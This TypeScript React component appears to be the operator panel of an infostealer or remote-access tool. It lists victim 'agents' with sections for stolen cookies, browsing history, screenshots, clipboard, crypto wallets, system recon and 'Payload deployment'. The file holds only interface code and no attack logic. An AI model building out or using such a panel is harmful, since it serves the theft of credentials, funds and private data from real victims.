
import React from 'react';

interface AgentDetailsProps {
  selectedAgent: string | null;
  onSectionSelect: (section: string) => void;
  activeSection: string;
}

const detailSections = [
  { name: 'Overview', icon: '▣', desc: 'System information' },
  { name: 'Cookies', icon: '◈', desc: 'Browser cookies' },
  { name: 'History', icon: '◧', desc: 'Browse history' },
  { name: 'Screenshots', icon: '◩', desc: 'Screen capture' },
  { name: 'Clipboard', icon: '◪', desc: 'Clipboard data' },
  { name: 'Wallets', icon: '◭', desc: 'Crypto wallets' },
  { name: 'System Recon', icon: '◮', desc: 'System recon' },
  { name: 'Bookmarks', icon: '◯', desc: 'Bookmarks data' },
  { name: 'Infection', icon: '⚠', desc: 'Payload deployment' }
];

const AgentDetails: React.FC<AgentDetailsProps> = ({ selectedAgent, onSectionSelect, activeSection }) => {
  if (!selectedAgent) {
    return (
      <div className="h-full flex items-center justify-center">
        <div className="text-center">
          <div className="text-green-600 mb-4">
            ╔═══════════════════════════════╗<br />
            ║                               ║<br />
            ║     NO AGENT SELECTED         ║<br />
            ║                               ║<br />
            ║  Select an agent from the     ║<br />
            ║  list to view data sections   ║<br />
            ║                               ║<br />
            ╚═══════════════════════════════╝
          </div>
          <p className="text-green-400 text-sm">← Select agent to continue</p>
        </div>
      </div>
    );
  }

  return (
    <div className="h-full p-6">
      <div className="mb-6">
        <h3 className="text-lg font-bold text-green-400 mb-2 terminal-text">
          ┌─[ AGENT DATA SECTIONS ]
        </h3>
        <div className="text-cyan-400 text-sm">
          │ Active Agent: {selectedAgent}<br />
          └─ Select section to analyze
        </div>
      </div>
      
      <div className="grid grid-cols-1 gap-2">
        {detailSections.map((section, index) => (
          <button
            key={section.name}
            onClick={() => onSectionSelect(section.name)}
            className={`
              text-left p-4 border transition-colors font-mono
              ${activeSection === section.name
                ? 'bg-green-400 border-green-400 text-black'
                : 'bg-black border-green-400 text-green-400 hover:bg-green-400/20 hover:border-cyan-400'
              }
            `}
          >
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <span className="mr-3 text-lg">{section.icon}</span>
                <div>
                  <div className="font-bold">
                    {index + 1 < 10 ? `0${index + 1}` : index + 1}. {section.name}
                  </div>
                  <div className="text-xs opacity-70">{section.desc}</div>
                </div>
              </div>
              <span className="text-xs">►</span>
            </div>
          </button>
        ))}
      </div>
      
      <div className="mt-6 border-t border-green-400 pt-4">
        <div className="text-xs text-green-600">
          ┌─[ STATUS ]<br />
          ├─ Sections: {detailSections.length}<br />
          ├─ Active: {activeSection}<br />
          └─ Ready for analysis
        </div>
      </div>
    </div>
  );
};

export default AgentDetails;
